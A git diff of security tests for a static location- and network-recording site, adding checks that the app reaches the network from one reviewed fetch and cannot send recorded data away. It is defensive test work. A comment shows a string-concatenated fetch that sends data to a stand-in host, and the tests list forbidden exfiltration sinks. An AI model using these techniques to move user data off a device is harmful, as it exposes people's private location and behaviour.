@@ -1,6 +1,6 @@
 // Security tests. This is a static site that records a person's location and network
 // behaviour for forty minutes at a time, so the properties worth guarding are: it talks to
-// nothing but its six probes, it has no way to upload what it records, it executes no
+// nothing but its seven probes, it has no way to upload what it records, it executes no
 // dynamic code, and it ships no third-party code at all.
 import assert from 'node:assert';
 import {readFileSync, readdirSync} from 'node:fs';
@@ -47,12 +47,76 @@ s.test('no outbound origin exists outside the declared probe allowlist', () => {
   assert.ok(found.size > 0, 'the allowlist check actually inspected something');
 });
 
+// Scanning for forbidden URL literals only catches an exfiltration path written in the
+// clear. `fetch('https:' + '//elsewhere/?d=' + data)` and a protocol-relative `//elsewhere`
+// both walk straight through it. Enumerating the call sites instead makes the check
+// exhaustive: there is one way to reach the network from this application, and it is
+// reviewable in a single expression.
+s.test('the network can be reached from exactly one place, with a URL it did not invent', () => {
+  const calls = [];
+  for (const [file, src] of sources) {
+    for (const m of src.matchAll(/\bfetch\s*\(/g)) {
+      const line = src.slice(src.lastIndexOf('\n', m.index) + 1, src.indexOf('\n', m.index));
+      calls.push({file, line: line.trim()});
+    }
+  }
+  const app = calls.filter(c => c.file.startsWith('js/'));
+  assert.equal(app.length, 1, `one fetch in the application: ${app.map(c => c.file + ' ' + c.line)}`);
+  assert.match(app[0].line, /await fetch\(url, \{$/, `and its URL is the probe's own: ${app[0].line}`);
+
+  const probe = read('js/probe.js');
+  // `url` can only come from probeUrl, which can only come from the PROBES table.
+  assert.match(probe, /const url = probeUrl\(probe\);/, 'url is built by probeUrl');
+  for (const m of probe.matchAll(/function probeUrl\(probe\) \{[\s\S]*?\n\}/g)) {
+    assert.ok(!/\+/.test(m[0].replace(/\/\/.*/g, '')) || /replace\(/.test(m[0]),
+              `probeUrl assembles a URL by hand: ${m[0]}`);
+  }
+
+  const sw = calls.filter(c => c.file === 'sw.js');
+  assert.equal(sw.length, 2, 'the service worker fetches only to fill and serve its shell');
+  for (const c of sw) {
+    assert.ok(/fetch\(new Request\(u, \{cache: 'reload'\}\)\)/.test(c.line) ||
+              /fetch\(e\.request\)/.test(c.line), `unreviewed service worker fetch: ${c.line}`);
+  }
+});
+
 s.test('no request can carry a body, so nothing recorded can leave the device', () => {
   for (const [file, src] of sources) {
+    // Shorthand properties: `{method, body}` says the same thing as `method: 'POST'` and
+    // used to pass unnoticed, so the identifiers are banned outright.
     assert.ok(!/method:\s*['"](POST|PUT|PATCH)['"]/i.test(src), `${file} issues a write request`);
-    assert.ok(!/\bbody\s*:/.test(src.replace(/res\.body|\.body\b/g, '')), `${file} attaches a request body`);
+    assert.ok(!/\bbody\s*[:,}]/.test(src.replace(/res\.body|\.body\b/g, '')),
+              `${file} attaches a request body`);
+    assert.ok(!/\bmethod\s*[,}]/.test(src), `${file} passes a method it computed`);
     assert.ok(!/navigator\.sendBeacon/.test(src), `${file} uses sendBeacon`);
     assert.ok(!/new\s+(WebSocket|EventSource)/.test(src), `${file} opens a persistent channel`);
+  }
+});
+
+// A request does not have to be a fetch. An image, a stylesheet or a preload hint carries a
+// URL to a third party just as well, and CSP is the only thing that would stop them at
+// runtime — which is not a reason for the source to contain one.
+s.test('no other tag or API can be used to carry a URL off the device', () => {
+  for (const [file, src] of sources) {
+    for (const sink of ['new Image', 'new Audio', 'importScripts', 'navigator.sendBeacon',
+                        'XMLHttpRequest']) {
+      assert.ok(!src.includes(sink), `${file} uses ${sink}`);
+    }
+    // Saving the recording is the one place a URL is put on an element, and it addresses a
+    // blob this code just built. Anything else assigned to src/href/action would be a
+    // request to somewhere, issued without a fetch.
+    for (const m of src.matchAll(/\.(src|href|action)\s*=\s*([^;\n]+)/g)) {
+      assert.equal(`${file}:${m[1]}=${m[2].trim()}`, `${file}:href=url`,
+                   `${file} assigns ${m[1]} = ${m[2].trim()}`);
+    }
+    for (const m of src.matchAll(/createObjectURL\(([^)]*)/g)) {
+      assert.match(m[1], /^new Blob\(\[/, `${file}: createObjectURL over ${m[1]}, not a local blob`);
+    }
+    // Protocol-relative literals inherit https: at runtime and match no origin check.
+    assert.ok(!/['"`]\/\/[a-z0-9]/i.test(src), `${file} contains a protocol-relative URL`);
+  }
+  for (const tag of ['<img', '<iframe', '<object', '<embed', '<form']) {
+    assert.ok(!html.includes(tag), `index.html contains ${tag}`);
   }
 });
 
@@ -202,9 +266,11 @@ s.test('every committed fixture has been through the anonymiser', async () => {
 s.test('no journey recording is tracked anywhere in the tree', () => {
   const tracked = execFileSync('git', ['ls-files'], {cwd: root, encoding: 'utf8'})
     .split('\n').filter(Boolean);
-  // An export is recognisable by its shape, wherever it was put.
+  // An export is recognisable by its shape, wherever it was put and whatever it was named:
+  // scanning only .json meant a recording saved as .txt or pasted into a note went unseen.
+  const binary = /\.(png|jpg|jpeg|gif|svg|ico|woff2?|ttf|zip|pdf)$/;
   for (const f of tracked) {
-    if (!f.endsWith('.json') || f.endsWith('package.json') || f.endsWith('package-lock.json')) continue;
+    if (f === 'package.json' || f === 'package-lock.json' || binary.test(f)) continue;
     const text = readFileSync(new URL(`../${f}`, import.meta.url), 'utf8');
     assert.ok(!/"format"\s*:\s*"wts\/(session|bundle)"/.test(text),
               `${f} is a recorded journey and must not be committed`);
